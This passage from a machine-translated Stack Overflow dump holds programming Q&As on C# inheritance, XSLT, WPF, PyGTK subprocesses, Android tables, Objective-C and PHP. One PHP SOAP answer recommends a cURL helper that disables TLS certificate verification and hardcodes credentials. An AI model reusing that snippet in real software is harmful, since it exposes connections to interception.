/*and so so till...*/
System.Object 
```

但不幸的是，即使我将对象转换为它的 BaseType，“C# 多态性”也只会将其**VIEW**限制为基本类型，并且不会从**REAL基本对象返回****REAL**引用给我！让我们通过一个例子来描述它；如果我有

 **```
class Person {
public string Name;
public string LastName;
}
class President : Person {
public string password;
}

main(){
President pr = new President() {Name="John"; LastName="Smith"; password="js123" };
Person p = (Person)pr;
SendToAirportSystemAcrossInternet(p);
} 
```

虽然我们认为*p*是一个*人*，但它不是！它是*总统*，*p*只是它的一个视图，所以总统的密码会在互联网上传播！

关于如何将对象修​​剪或切片以创建真正的基础对象的任何想法？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:59:13.490

您要实现的目标不是很明显，但是当您对对象的继承层次结构感兴趣时，您很可能希望处理`System.Type`. 这是您发布的第一种方法的工作版本，它可能会提示您如何从那里继续：

```
static void PrintObjectHierarchy(object o)
{
    Type t = o.GetType();
    while (t != null)
    {
        Console.WriteLine(t.FullName);
        t = t.BaseType;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:34:55.150

丹尼尔的解决方案有效；另一种类似的方法是编写一个“复制构造函数”并以这种方式创建一个新人。

因此，您的 person 类变为：

```
public class Person
{
    public Person()
    {
    }

    public Person(Person p)
    {
        this.name = p.name;
        this.lastName = p.lastName
    }

    public string name;
    public string lastName;
} 
```

您可以像这样从总统创建一个人：

```
President pres = new President() { name = "abc", lastName = "def", password = "kittens" };
Person p = new Person(pres); 
```

这从总统那里创建了一个人，但没有办法回到总统那里，也没有办法得到密码。如果您创建一个 this was 并投给一位总统，您将得到一个`InvalidCastException`，我认为这就是您想要的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-09T15:59:54.113

基本上，你不能做你想做的事。您应该重新设计，以便您没有此要求。

正如我在评论中指出的那样，当执行时类型是派生类时，基类中的一组字段可能是有效的，但对于该类的实例无效。此外，当以这种方式查看对象时，可能有各种其他保护措施变得无效。例如，基类可能持有对值集合的引用，而派生类期望验证添加到该集合中的值。当对象被“修剪”时，该验证将被删除，但引用与以前相同的集合：

```
// EvenNumbersOnlyCollection rejects odd numbers
EvenNumberCollection derived = new EvenNumbersOnlyCollection();
NumberCollection pruned = Prune<NumberCollection>(derived);
pruned.Add(5);

// This would return 5 - the invariant is broken!
int shouldBeEven = derived.First(); 
```

目前尚不清楚*为什么*您认为这种修剪是个好主意，但您应该尝试以其他方式实现更广泛的目标。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T10:27:12.020

在 C# 中创建对象时，总是将其转换为其原始类型。即使您将其用作基础对象或接口，调用 p.GetType() 也将始终返回原始类型。

如果您需要创建一个新对象，然后需要修剪其基础对象，则需要创建一个新类型的对象。例如：

```
public class ParentClass
{
  public Parent(int feature1)
  {
    mFeature1 = feature1;
  }
}

public class ChildClass : ParentClass
{
  public ChildClass(int feature1, int feature2) : base(feature1)
  {
    mFeature2 = feature2;
  }
}

...
...
ChildClass cc = new ChildClass(10, 20);
ParentClass pc = (ParentClass)cc; // pc still is of type ChildClass
ParentClass ccAsParent = new ParentClass(cc.Feature1); //ccAsParent is of type ParentClass
...
... 
```

**请记住，只有在父类不是abstract**时才能这样做。**

# javascript - 在 phpStorm 中运行（执行）EcmaScript

> ID：10514088
> 
> 赞同：0
> 
> 时间：2012-05-09T10:16:25.067
> 
> 标签：javascript, phpstorm

有什么方法可以在 PhpStorm 中本地运行 Ecmascript（没有 DOM 的 JS）脚本并在控制台中查看结果？（不运行浏览器）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:36:19.980

PhpStorm[支持](http://www.jetbrains.com/phpstorm/webhelp/running-and-debugging-node-js.html) [Node.js](http://nodejs.org/) [运行和调试](http://www.jetbrains.com/phpstorm/webhelp/running-and-debugging-node-js.html)`Settings`，从（`Preferences`Mac 上）安装 Node.js 插件| `Plugins`.

# xml - 具有特定值的节点上的 XSL for-each 调用模板

> ID：10514089
> 
> 赞同：1
> 
> 时间：2012-05-09T10:16:31.503
> 
> 标签：xml, xslt, xslt-1.0

具有这样的 XML 结构：

```
<ContextDoc>
  <PurchaseOrder xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <OrderForms>
      <OrderForm>
        <Shipments>
          <Shipment>
            ...
            <ShippingMethodId>17995798-a2cc-43ad-81e8-bb932f6827e4</ShippingMethodId>
            ...
          </Shipment>
          <Shipment>
            ...
            <ShippingMethodId>11223344-a2cc-11bc-25a7-aa345f6827e6</ShippingMethodId>
            ...
          </Shipment>
        </Shipments>
        <LineItems>
          <LineItem>
            ...
            <ShippingMethodId>17995798-a2cc-43ad-81e8-bb932f6827e4</ShippingMethodId>
            ...
          </LineItem>
          <LineItem>
            ...
            <ShippingMethodId>17995798-a2cc-43ad-81e8-bb932f6827e4</ShippingMethodId>
            ...
          </LineItem>
          <LineItem>
            ...
            <ShippingMethodId>11223344-a2cc-11bc-25a7-aa345f6827e6</ShippingMethodId>
            ...
          </LineItem>
        </LineItems>
      </OrderForm>
    </OrderForms>
  </PurchaseOrder>
</ContextDoc> 
```

从与每个 Shipment 节点匹配的模板中，我想用当前的 ShippingMethodId 循环 LineItems。像这样：

```
<xsl:template match="Shipment">
    <xsl:for-each select="//LineItems/LineItem[ShippingMethodId=./ShippingMethodId]">
      <xsl:call-template name="LineItem">
      </xsl:call-template>
    </xsl:for-each>
</xsl:Template> 
```

但这给了我每个 Shipment 下的所有 LineItems。为特定 LineItem 节点调用模板的正确方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:21:13.977

用于[`current()`](http://www.w3.org/TR/xslt#function-current)指向循环外的上下文。循环内部`.`指向lopp 的当前元素的上下文。像这样：

```
<xsl:for-each select="//LineItems/LineItem[ShippingMethodId=current()/ShippingMethodId]"> 
```

此外，感觉就像您可以通过“匹配”完成所有您需要的事情，而无需调用函数之类的模板。让我们更多地了解您要完成的工作，我们可能会推荐一种更符合意识形态的方式来实现目标。例如，如果您需要按这些`ShippingMethodId`s 进行分组，您可以使用[Muenchian 方法](http://www.jenitennison.com/xslt/grouping/muenchian.html)。

# wpf - 数据网格处于编辑模式时禁用按钮

> ID：10514091
> 
> 赞同：0
> 
> 时间：2012-05-09T10:16:34.613
> 
> 标签：wpf, xaml, wpfdatagrid

我有一个用户控件，其中一个 DataGrid 绑定到一个 observablecollection 项目和两个按钮：保存更改和放弃更改。

我的问题是，当用户编辑 datagridrow 时，按钮保持可点击但未执行。

有没有办法在 DataGrid 处于编辑模式时禁用按钮？

我试过这段代码没有成功：

```
<Button Content="SaveChanges" Command="{Binding Path=CmdSaveChanges}" 
                IsEnabled="{Binding ElementName=MyDataGrid, Path=IsEditing, Converter={StaticResource InverseBooleanConverter}}" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:55:47.533

您正在绑定到名为DataGrid`IsEditing`的元素的属性。`MyDataGrid`但是，DataGrid 没有这样的属性。

尽管[DataGridCell](http://msdn.microsoft.com/en-us/library/cc189426.aspx)具有[IsEditing](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagridcell.isediting.aspx)属性，但没有简单的方法可以获取当前正在编辑的单元格。[DataGrid.CurrentCell](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagrid.currentcell.aspx)不会给你 DataGridCell，而只会给你一个[DataGridCellInfo](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagridcellinfo.aspx)。

将处理程序附加到 DataGrid 的[BeginningEdit](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagrid.beginningedit.aspx)和[CellEditEnding](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagrid.celleditending.aspx)事件可能会更好。

# python - gobject 和 subprocess.Popen 在 GTK GUI 中进行通信

> ID：10514094
> 
> 赞同：1
> 
> 时间：2012-05-09T10:16:41.450
> 
> 标签：python, pygtk, multiprocessing, popen, gobject

我正在尝试使用 gobject 来允许 Popen 进程和 GTK GUI 之间的通信。

受此启发： [https ://pygabriel.wordpress.com/2009/07/27/redirecting-the-stdout-on-a-gtk-textview/#comment-156](https://pygabriel.wordpress.com/2009/07/27/redirecting-the-stdout-on-a-gtk-textview/#comment-156)

我实现了类似的东西：

[http://hartree.altervista.org/files/command-textview.py](http://hartree.altervista.org/files/command-textview.py)

但我注意到即使 Popen 进程终止，gobject 也会使用大量 CPU 周期。只需运行上面的脚本并观察 Ubuntu 系统监视器。

在与“pty”一起工作后，我想出了这个：

```
import gtk,pygtk
import subprocess
import gobject
import pty, os, time

class CommandTextView(gtk.TextView):
    def __init__(self):
        super(CommandTextView,self).__init__()
        self.master, self.slave = pty.openpty()
        gobject.io_add_watch(os.fdopen(self.master), gobject.IO_IN, self.write_to_buffer)
        self.proc = None

    def run(self, w, cmd):
        if self.proc == None or self.proc.poll() != None: # poll()=None means still running
            self.proc = subprocess.Popen(cmd.split(), shell=True, stdout=self.slave, stderr=self.slave)

    def stop(self,w):
        if type(self.proc) is subprocess.Popen:
            self.proc.kill()
            while self.proc.poll() == None:
                time.sleep(0.1)
            self.proc = None

    def write_to_buffer(self, fd, condition):
        if condition == gobject.IO_IN:
            char = fd.readline()
            print 'adding:',char    
            buf = self.get_buffer()
            buf.insert_at_cursor(char)
            return True
        else:
            return False

def test():
    win=gtk.Window()
    vbox = gtk.VBox(False, 0)
    win.set_size_request(300,300)
    win.connect('delete-event',lambda w,e : gtk.main_quit())
    ctv=CommandTextView()
    bt1 = gtk.Button('Run')
    bt2 = gtk.Button('Stop')
    vbox.pack_start(ctv)
    vbox.pack_end(bt2,False,False)
    vbox.pack_end(bt1,False,False)
    win.add(vbox)

    bt1.connect("clicked", ctv.run, 'ls -la')
    bt2.connect("clicked", ctv.stop)
    win.show_all()
    gtk.main()

if __name__=='__main__': test() 
```

我的问题是：

*   pty 是个好主意吗？它也可以用于Windows吗？

*   是否可以避免使用 pty 而只使用 stdout 而没有高 CPU 使用率问题？

*   如果您第一次运行此脚本，它似乎会缓冲 txt 输出并给出不完整的输出。

感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-07-19T05:42:19.713

这是给那些在 2016 年之后偶然发现这篇文章并试图将其重写为 Gtk3 的人的。

```
#!/usr/bin/env python3

import gi
gi.require_version('Gtk', '3.0')

from gi.repository import Gtk
from gi.repository import GObject

import os
import fcntl
import subprocess

def unblock_fd(stream):
    fd = stream.fileno()
    fl = fcntl.fcntl(fd, fcntl.F_GETFL)
    fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

class StreamTextBuffer(Gtk.TextBuffer):
    '''TextBuffer read command output syncronously'''
    def __init__(self):
        Gtk.TextBuffer.__init__(self)
        self.IO_WATCH_ID = tuple()

    def bind_subprocess(self, proc):
        unblock_fd(proc.stdout)
        watch_id_stdout = GObject.io_add_watch(
            channel   = proc.stdout,
            priority_ = GObject.IO_IN,
            condition = self.buffer_update,
            # func      = lambda *a: print("func") # when the condition is satisfied
            # user_data = # user data to pass to func
        )

        unblock_fd(proc.stderr)
        watch_id_stderr = GObject.io_add_watch(
            channel   = proc.stderr,
            priority_ = GObject.IO_IN,
            condition = self.buffer_update,
            # func      = lambda *a: print("func") # when the condition is satisfied
            # user_data = # user data to pass to func
        )

        self.IO_WATCH_ID = (watch_id_stdout, watch_id_stderr)
        return self.IO_WATCH_ID

    def buffer_update(self, stream, condition):
        self.insert_at_cursor(stream.read())
        return True # otherwise isn't recalled

def sample():
    root = Gtk.Window()
    root.set_default_size(400, 260)
    root.connect("destroy", Gtk.main_quit)
    root.connect( # quit when Esc is pressed
        'key_release_event',
        lambda w, e: Gtk.main_quit() if e.keyval == 65307 else None
    )
    layout = Gtk.Box(orientation=1)
    scroll = Gtk.ScrolledWindow()
    layout.pack_start(scroll, expand=1, fill=1, padding=0)

    buff = StreamTextBuffer()
    textview = Gtk.TextView.new_with_buffer(buff)
    scroll.add(textview)

    button_start = Gtk.Button("Execute Command")
    layout.add(button_start)

    def on_click(widget):
        if len(buff.IO_WATCH_ID):
            for id_ in buff.IO_WATCH_ID:
                # remove subprocess io_watch if not removed will
                # creates lots of cpu cycles, when process dies
                GObject.source_remove(id_)
            buff.IO_WATCH_ID = tuple()
            on_click.proc.terminate() # send SIGTERM
            widget.set_label("Execute Command")
            return

        on_click.proc = subprocess.Popen(
            [ 'ping', '-c', '3', 'localhost' ],
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
            universal_newlines=True,
        )
        buff.bind_subprocess(on_click.proc)
        widget.set_label("STOP!")

    button_start.connect("clicked", on_click)
    root.add(layout)
    root.show_all()

if __name__ == "__main__":
    sample()
    Gtk.main() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T00:30:36.187

使用无缓冲读取`os.read`，它需要一个实际的文件描述符。你的 fd 不是一个真正的文件描述符，它是一个文件对象；通常称为 f。

如果您想确保进程已死，请使用 os.kill。

# android - 如何知道我的 Android SmartWatch 扩展程序是否处于非活动状态？

> ID：10514095
> 
> 赞同：2
> 
> 时间：2012-05-09T10:16:44.217
> 
> 标签：android, sony, sony-smartwatch

我正在使用通知 API 开发一个 RSS 智能扩展应用程序。我想知道如何获取我的智能扩展的活动/非活动状态（在 SmartWatch 应用程序中单击我的 RSS 智能扩展时的第一个复选框）。

NotificationAPI 示例使用额外的复选框首选项来启动或不下载数据生成通知的服务，但我不想强迫用户进入子菜单并激活数据下载。如果用户激活了我的 RSS 智能扩展，他已经希望扩展在 RSS 中有一些新项目时通知他。

有一个回调可以知道我的智能扩展何时正确添加到 liveware/smartwatch 应用程序 (onRegisterResult)，但我没有找到回调来知道智能扩展是否实际处于活动状态。

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-11T07:02:30.310

智能扩展 SDK 的 SampleNotificationExtension 提供了一些示例：

*   如何通过内容提供程序向/从驻留在 Liveware Manager 应用程序（智能扩展 API 的中心）中的通知数据库添加/更新/删除/读取数据

*   如何响应用户在 SmartWatch 上打开通知并按下操作按钮的事件

在示例扩展中，有一个服务每 10 秒提供一次通知数据库，然后显示在 SmartWatch 设备上。首选项活动中的开/关设置仅用于启动和停止为数据库提供数据的循环。

行。

所以我猜你想订阅 RSS 提要，当新帖子到达时，你希望它们被传播到 SmartWatch。您可能需要启动一项服务，如示例中所示，并且只要手表连接到手机，您就应该运行该服务。您可以在此处指定：

```
@Override
protected boolean keepRunningWhenConnected() {
    return true;
} 
```

如果您使用 SmartExtension 实用程序类，您的扩展将自动注册并启动您的服务。在示例扩展中，在扩展注册后，会检查用户是否通过首选项激活了扩展。

```
@Override
public void onRegisterResult(boolean result) {
    /.../
    boolean isActive = prefs.getBoolean(
            getString(R.string.preference_key_is_active), false);
    if (isActive) {
        startAddData();
    }
} 
```

如果你愿意，你可以保留它，但这不是必需的。如前所述，它仅用于启动和停止数据馈送。无论如何，您可以在注册后开始 RSS 检查。

> 如果用户激活了我的 RSS 智能扩展，他已经希望扩展在 RSS 中有一些新项目时通知他。

当服务启动时，您可以检查通知数据库中的内容与 RSS 提要提供的内容之间的差异。

嗯，答案很长，希望对您有所帮助！

# php - 如何在 php Zend 中向肥皂请求添加安全标头

> ID：10514096
> 
> 赞同：0
> 
> 时间：2012-05-09T10:16:47.020
> 
> 标签：php, zend-framework, soap, soap-client

我正在使用 WS 安全性调用基于 JAVA 的肥皂服务。但是每当我尝试调用这些服务时，它们都会给出安全标头无效的错误。谁能告诉我如何构建安全标头并使用 php zend 框架构建 Soap 请求。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-11T21:51:28.823

如果您可以发布到目前为止的代码以尝试为您排除故障，这将很有帮助。否则，这是一个没有任何代码的示例。

我们也使用 Zend 框架，并且需要将安全标头传递给 HTTPS 服务。Zend Framework SOAP 安全标头在 IMO 的开发中相当落后，我们发现基本的 PHP CURL 工作得更好，也很容易实现。

在 Authorization: Basic (below) 中，您会注意到 base64_encode... 这是我们传递用户 ID 的地方：密码。

```
function makeRequest($requestData){     
        $str = "site_id=62621&service_name=TestService&fx_request=" . $reqeustData;
        $strLength = strlen($str);

        $headers = array(
                "Authorization: Basic " . base64_encode("12321:123456123456321654"),
                "Content-Type: application/x-www-form-urlencoded", 
                "Content-Length: $strLength",
            ); 

        $url = 'https://siteName.Here.com/WebServices/AccountingService';

        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        curl_setopt($ch, CURLOPT_POST, 1);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $str);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 80);

        curl_setopt($ch, CURLOPT_TIMEOUT, 80);

        $response = curl_exec($ch);

        if (curl_errno($ch)) { 
            return "Error: " . curl_error($ch);
        } else {
            curl_close($ch);  
            return $response; 
        }
    } 
```

希望这可以帮助。

* * *

--编辑到以前的答案，对具有 WSSE 安全性的 WSDL 的 RE 评论 --

那么对于 WSSE 安全性，有这个 Zend Framework 类

```
class Zend_Service_DeveloperGarden_Client_Soap extends Zend_Soap_Client 
```

哪个有这个功能，我相信这就是你要找的

```
addWsseSecurityTokenHeader 
```

请参阅此链接以获取 [Zend Framework 网站上的详细描述类描述](http://framework.zend.com/apidoc/1.10/_Service_DeveloperGarden_Client_Soap.html)

[请参阅此链接以查看Zend Framework 网站上](http://www.google.com/url?sa=t&rct=j&q=wsse%20zend%20php&source=web&cd=2&ved=0CGsQFjAB&url=http://framework.zend.com/svn/framework/standard/branches/user/zf-ldap-dev/library/Zend/Service/DeveloperGarden/Client/Soap.php&ei=OwGxT9CoJsP56QH1vuyfCQ&usg=AFQjCNGXQZwwClXb6spDpxf5tLBokYsmtA)的实际 代码文件代码文件

# android - 如何从动态创建的 android TableRow 中获取值？

> ID：10514097
> 
> 赞同：4
> 
> 时间：2012-05-09T10:16:47.267
> 
> 标签：android, tablerow, android-tablelayout

我使用下面的代码动态创建了一个`TableRow`内容。它工作得很好，但我希望获得`TableRow`. 这是示例代码（我从 Google 获得的），它在`TableRow`. 当我在任何位置单击时，它会在（我希望类似于 a ）`TableRow`中给出相应的值。`TableRow``ListView`

**All_CustomsActivity.java**

```
public class All_CustomsActivity extends Activity {

    String companies[] = { "Google", "Windows", "iPhone", "Nokia", "Samsung",
            "Google", "Windows", "iPhone", "Nokia", "Samsung", "Google",
            "Windows", "iPhone", "Nokia", "Samsung" };
    String os[] = { "Android", "Mango", "iOS", "Symbian", "Bada", "Android",
            "Mango", "iOS", "Symbian", "Bada", "Android", "Mango", "iOS",
            "Symbian", "Bada" };

    TableLayout tl;
    TableRow tr;
    TableRow mTable = null;
    TextView companyTV, valueTV;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        tl = (TableLayout) findViewById(R.id.maintable);
        // addHeaders();
        addData();

    }

    /** This function add the headers to the table **/
    public void addHeaders() {

        /** Create a TableRow dynamically **/
        tr = new TableRow(this);
        tr.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,
                LayoutParams.WRAP_CONTENT));

        /** Creating a TextView to add to the row **/
        TextView companyTV = new TextView(this);
        companyTV.setText("Companies");
        companyTV.setTextColor(Color.GRAY);
        companyTV.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        companyTV.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,
                LayoutParams.WRAP_CONTENT));
        companyTV.setPadding(5, 5, 5, 0);
        tr.addView(companyTV); // Adding textView to tablerow.

        /** Creating another textview **/
        TextView valueTV = new TextView(this);
        valueTV.setText("Operating Systems");
        valueTV.setTextColor(Color.GRAY);
        valueTV.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,
                LayoutParams.WRAP_CONTENT));
        valueTV.setPadding(5, 5, 5, 0);
        valueTV.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        tr.addView(valueTV); // Adding textView to tablerow.

        // Add the TableRow to the TableLayout
        tl.addView(tr, new TableLayout.LayoutParams(LayoutParams.FILL_PARENT,
                LayoutParams.WRAP_CONTENT));

        // we are adding two textviews for the divider because we have two
        // columns
        tr = new TableRow(this);
        tr.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,
                LayoutParams.WRAP_CONTENT));

        /** Creating another textview **/
        TextView divider = new TextView(this);
        divider.setText("-----------------");
        divider.setTextColor(Color.GREEN);
        divider.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,
                LayoutParams.WRAP_CONTENT));
        divider.setPadding(5, 0, 0, 0);
        divider.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        tr.addView(divider); // Adding textView to tablerow.

        TextView divider2 = new TextView(this);
        divider2.setText("-------------------------");
        divider2.setTextColor(Color.GREEN);
        divider2.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,
                LayoutParams.WRAP_CONTENT));
        divider2.setPadding(5, 0, 0, 0);
        divider2.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        tr.addView(divider2); // Adding textView to tablerow.

        // Add the TableRow to the TableLayout
        tl.addView(tr, new TableLayout.LayoutParams(LayoutParams.FILL_PARENT,
                LayoutParams.WRAP_CONTENT));
    }

    /** This function add the data to the table **/
    public void addData() {

        for (int i = 0; i < companies.length; i++) {
            /** Create a TableRow dynamically **/
            tr = new TableRow(this);
            tr.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,
                    LayoutParams.WRAP_CONTENT));
            // ImageView im = new ImageView(this);
            // im.setBackgroundResource(R.drawable.sample_image);
            // im.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,
            // LayoutParams.WRAP_CONTENT));
            // tr.addView(im);
            /** Creating a TextView to add to the row **/
            companyTV = new TextView(this);
            companyTV.setText(companies[i]);
            companyTV.setTextColor(Color.RED);
            companyTV.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
            companyTV.setLayoutParams(new LayoutParams(
                    LayoutParams.FILL_PARENT, LayoutParams.WRAP_CONTENT));
            companyTV.setPadding(5, 5, 5, 5);
            tr.addView(companyTV); // Adding textView to tablerow.

            /** Creating another textview **/
            valueTV = new TextView(this);
            valueTV.setText(os[i]);
            valueTV.setTextColor(Color.GREEN);
            valueTV.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,
                    LayoutParams.WRAP_CONTENT));
            valueTV.setPadding(5, 5, 5, 5);
            valueTV.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
            tr.addView(valueTV); // Adding textView to tablerow.

            // Add the TableRow to the TableLayout
            tl.addView(tr, new TableLayout.LayoutParams(
                    LayoutParams.FILL_PARENT, LayoutParams.WRAP_CONTENT));

            // tr.setOnClickListener(new View.OnClickListener() {
            // public void onClick(View view) {
            // view.setBackgroundColor(Color.DKGRAY);
            // }
            // });
            //
            // tr.setOnLongClickListener(new View.OnLongClickListener() {
            // public boolean onLongClick(View v) {
            // mTable = (TableRow) v; // assign selected TableRow gobally
            // openContextMenu(v);
            // return true;
            // }
            // });

        }
    }

    // @Override
    // public void onCreateContextMenu(ContextMenu menu, View v,
    // ContextMenu.ContextMenuInfo menuInfo) {
    // super.onCreateContextMenu(menu, v, menuInfo);
    // menu.add(0, v.getId(), 0, "Do YourStuff");
    //
    // }
    //
    // @Override
    // public boolean onContextItemSelected(MenuItem item) {
    // int ccount = (mTable).getChildCount();
    // String[] str = new String[ccount];
    // for (int i = 0; i < ccount; i++) {
    // TextView tv = (TextView) (((TableRow) mTable)).getChildAt(i);
    // str[i] = tv.getText().toString(); // set selected text data into the
    // // String array
    // }
    // Toast.makeText(All_CustomsActivity.this, Arrays.toString(str), 2)
    // .show();
    // return true;
    // }

} 
```

**主要的.xml**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/LinearLayout01"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" >

    <ScrollView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:scrollbars="none" >

        <TableLayout
            android:id="@+id/maintable"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:stretchColumns="0,1" >
        </TableLayout>
    </ScrollView>

</LinearLayout> 
```

在上面的代码中，注释了一些行，这些行是我已经尝试获取行值但失败的内容。谁能帮我这个？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-09T10:29:55.543

我猜你说的是通过`TableRow`点击获得这些值。如果是这种情况，您可以向您添加一个侦听器`TableRow`并使用它`getChildAt`来获取两者`TextViews`并获取数据：

```
//...
tr.setOnClickListener(new View.OnClickListener() {
   public void onClick(View view) {
      TableRow t = (TableRow) view;
      TextView firstTextView = (TextView) t.getChildAt(0);
      TextView secondTextView = (TextView) t.getChildAt(1);
      String firstText = firstTextView.getText().toString();
      String secondText = secondTextView.getText().toString();
   }
});
//... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T10:31:42.783

要首先从 textview 获取数据，您需要从中识别其父级，您需要获取您的 textView 子级位置，然后您可以从中获取数据......这是一个示例

```
 String myText;
((TextView) findViewById(R.id.tv)).setOnClickListener(new OnClickListener() {
  @Override
 public void onClick(View v) {                          
   TableRow tablerow = (TableRow)v.getParent();
   TextView items = (TextView) tablerow.getChildAt(2);

   myText = items.getText().toString();
  }
 }); 
```

# ios - 从 NSData 分配给“NSMutableData”的警告不兼容的指针类型

> ID：10514100
> 
> 赞同：1
> 
> 时间：2012-05-09T10:16:59.447
> 
> 标签：ios, nsxmlparser, nsdata

我收到警告::不兼容的指针类型从下面的代码中的“NSData”分配给“NSMutableData”

```
-(void) connectionDidFinishLoading:(NSURLConnection *) connection
{
    NSLog(@"DONE. Received Bytes: %d", [webData length]);
    NSString *theXML = [[[NSString alloc] initWithBytes: [webData mutableBytes] length [webData length] encoding:NSUTF8StringEncoding] autorelease];

    theXML = [theXML stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    theXML = [theXML stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    NSLog(@"%@",theXML);

    if( xmlParser )
    {
        xmlParser = nil;
        [xmlParser release];
    }

    NSMutableString *str = [[NSMutableString alloc]initWithString:theXML];
    webData = [str dataUsingEncoding:NSUTF16StringEncoding];//WARNING

    xmlParser = [[[NSXMLParser alloc] initWithData:webData] autorelease];
    [xmlParser setDelegate:self];
    [xmlParser setShouldResolveExternalEntities: YES];
    [xmlParser parse];

    [connection release];
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T10:31:45.597

采用

```
webData = [NSMutableData dataWithData:[str dataUsingEncoding:NSUTF16StringEncoding]]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:22:23.337

您不能将 NSData 分配给 NSMutableData。NSMutableData 包含使它能够变异的逻辑，如果你将它指向一个 NSData 对象，这个逻辑就会消失。您应该做的是使用以下语法附加数据：

```
[webData appendData:[str dataUsingEncoding:NSUTF16StringEncoding]]; 
```

# php - 如何根据选中的复选框在下拉选择中合并多个列表？

> ID：10514105
> 
> 赞同：0
> 
> 时间：2012-05-09T10:17:08.047
> 
> 标签：php, javascript, jquery, html, ajax

假设我们有 5 个复选框，每个复选框都有唯一的值映射到各自的元素列表，就我而言，我有关联的 PHP 数组 -

```
[100] => Array ( [0] => Array ( [name] => NameABC [sid] => 109 ) 
                 [1] => Array ( [name] => NameDEF [sid] => 110 ) 
               ) 

[101] => Array ( [0] => Array ( [name] => NamePQR [sid] => 337 ) 
                 [1] => Array ( [name] => NameXYZ [sid] => 339 ) 
               ) 
```

因此可以将值映射到每个列表，现在通过复选框的属性，您可以选择多个复选框（与单选按钮不同），因此当出现这种情况时，会根据每个复选框选择填充下拉列表，现在以合并格式出现，例如在选择 OPTION 1 和 OPTION 2 时，列表包含映射到两者的所有元素，进一步取消选择它会返回未合并状态。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:04:26.940

也许我过度简化了问题或遗漏了一些关键信息，但你能不能：

```
$merged = array();
foreach ($list as $l)
{
    $merged[] = $l;
} 
```

$list 是包含键 [101]、[102] 等的数组在哪里？

这会给你留下：

```
$merged = Array (
            [0] => Array ( [name] => NameABC [sid] => 109 )
            [1] => Array ( [name] => NameDEF [sid] => 110 )
            [2] => Array ( [name] => NamePQR [sid] => 337 ) 
            [3] => Array ( [name] => NameXYZ [sid] => 339 )
          ) 
```

或者如果`sid`对所有数组都是唯一的，也许这会更合适：

```
$merged = array();
foreach ($list as $l)
{
    $merged[$l['sid']] = $l['name'];
} 
```

给你：

```
$merged = Array (
            [109] => NameABC
            [110] => NameDEF
            [337] => NamePQR
            [339] => NameXYZ
          ) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-16T07:45:11.937

最后，在对我自己的问题进行迭代之后，我找到了几乎正确的答案。以下是我在此使用的*HTML*片段——

```
<tr>
<td align="center"  bgcolor="#BFD5EA" width="30%"><font size="1" face="Verdana"><b>Sales Channel :&nbsp;</b></font></td>
<td bgcolor="#E4E4E4" colspan="5"><font size="1" face="Verdana" width="70%">
~foreach from=$sales_channel item=r`
    <input type="checkbox" name="salestype[]" value="~$r.ROLE`"  id="~ $r.NAME`" >~$r.NAME`&nbsp;
~/foreach`
</td>
</tr>   
<tr style="display: none" id="nafrat"><td align="center"  bgcolor="#BFD5EA" width="30%"><font size="1" face="Verdana"><b>List of Executives:</font></b></td>
<td bgcolor="#E4E4E4" colspan="5" width="70%">
    <select name="selOnlSrc[]"  id="myops" multiple size="10" ><!--@@@@Done-->
